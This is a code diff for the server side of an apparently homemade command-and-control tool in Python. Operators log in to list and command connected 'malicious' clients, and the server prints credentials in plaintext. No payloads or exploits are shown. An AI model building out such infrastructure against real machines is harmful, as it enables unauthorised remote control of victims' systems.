@@ -10,7 +10,7 @@ from datetime import datetime
 HEADER = 64
 FORMAT = 'utf-8'
 
-global_debug = False
+global_debug = True
 
 class s_sock:
     ##########
@@ -45,6 +45,7 @@ class s_sock:
         
         ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
+            print("\nTOP OF CODE: listening...")
             self.conn, addr = self.server.accept()
             ##print("\\|/New Connection\\|/")
             
@@ -74,11 +75,13 @@ class s_sock:
             ## I'm sorry for the nested if's :( can definently split this up a bit into functions
             ## interact with server, on first connection
             if self.id == "!_userlogin_!":
+                print("PassSplit")
                 username, password = self.message.split("//|\\\\")
                 
                 ## == Password Eval
                 print(username, password)
                 if self.password_eval(password) == True:
+                    print("PassEval")
                     self.conn.send("0".encode())
                     print(f"Successful logon from {username}")
                     
@@ -97,15 +100,17 @@ class s_sock:
                         
                         ## drop into class, passing the connection, addr, and some other stuff
                         ## starts the thread - re think this
+                        
+                        
                         print(f"DEBUG: f_client msg: {self.response}")
                         friendly_thread = threading.Thread(target=self.friendly_client.friendly_client_communication, args=(self.conn, self.ADDR, self.response, username))
                         friendly_thread.start()
 
                         ## temp printing friendyl clients
-                        print("FriendlyClients:") if global_debug else None
-                        for var_name in globals():
-                            if var_name.startswith("!!~"):
-                                print(var_name)
+                        #print("FriendlyClients:") if global_debug else None
+                        #for var_name in globals():
+                            #if var_name.startswith("!!~"):
+                                #print(var_name)
                         #continue
 
                     else:
@@ -116,8 +121,8 @@ class s_sock:
                     self.conn.send("1".encode())
 
 
-            elif self.id == "!_usercommand_!":
-                print("usercommand function")
+            #elif self.id == "!_usercommand_!":
+                #print("usercommand function")
 
 
             ## handling commands - ma ynot need this
@@ -169,9 +174,16 @@ class s_sock:
         else:
             return False
         
-       
+################
+## Friendly Clients
+################  
 class s_friendlyclient:
 
+    def __init__(self):
+        self.ClientConnectionError = "Err: 0x01 ClientConnectionError"
+        self.InputNotUnderstood = "Err: 0x02 InputNotUnderstood"
+        self.UnknownError = "Err: 0x0? uh... no idea..."
+        
     def friendly_client_communication(self, conn, addr, message, username):
                 
         self.conn = conn
@@ -181,12 +193,26 @@ class s_friendlyclient:
         ## listens for command
         ## runs command_process
         ## returns result to friedly client
-
+        print(f"DEBUG: friendly_client func, user: {username}")
+        #print(self.conn.recv(1024).decode())
             
-        while message:
+        while True:
+            ## Waiting on input from client, on a per thread/friedly client basis until disconnection
+            ## diffeerent than malicious clients, as they are constantly checking in, this is a more
+            ## consistent connection
+            raw_user_input = self.conn.recv(1024).decode()
+            user_input = self.parse_msg(raw_user_input)
+            
+            ## For readability:
+            user_username = user_input[0]
+            user_command = user_input[1]
+            
+            print(f"DEBUG: UserInput: {user_input}")
+            
             ## Receiveing message from server portion & running through filters
             print("Call Decision Tree") if global_debug else None
-            self.decision_tree(message)
+            
+            self.decision_tree(user_command)
             
             if not message:
 
@@ -201,15 +227,42 @@ class s_friendlyclient:
     def decision_tree(self, message):
 
         if message == "clients":
-            #send self.current_clients
-            print(self.current_clients)
+            current_clientlist = ""
+            for var_name in globals():
+                if var_name.startswith("client_"):
+                    ## Sanity check to turn var_name into a string just in case
+                    current_clientlist += f"{var_name}\n"
+            
+            #print(self.current_clients)
+            self.send_msg(current_clientlist)
 
-        else:
+        elif message == "stats":
             pass
+            ## Need: client instance name
+            ## then. client_instance.stats
+            
+        
+        else:
+            self.send_msg(self.InputNotUnderstood)
 
-##########
-## Per Client Class
-##########
+    def send_msg(self, message:str):
+        ## encoding with global str_encode
+        encoded_response = str_encode(message)
+        self.conn.send(encoded_response)
+    
+    def parse_msg(self, raw_message) -> list:
+        print(f"Raw Message: {raw_message}")
+        
+        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
+        parsed_results_list = raw_message.replace("!_usercommand_!\\|/","").split("//|\\\\")
+        
+        print(f"Parsed Message: {parsed_results_list}")
+        
+        return parsed_results_list
+
+#################################
+## Per (malicious) Client Class
+################################
 
 class s_perclient:
     def __init__(self):
@@ -372,7 +425,18 @@ class s_perclient:
         #recieve_msg = self.conn.recv(1024).decode()
         #return recieve_msg
 
+################
+## QOL Functions
+################
+## bytes -> str
+def str_decode(input) -> str:
+    decoded_result = input.decode()
+    return decoded_result
 
+## str -> bytes
+def str_encode(input) -> bytes:
+    encoded_result = input.encode()
+    return encoded_result
     
     
 if __name__ == "__main__":
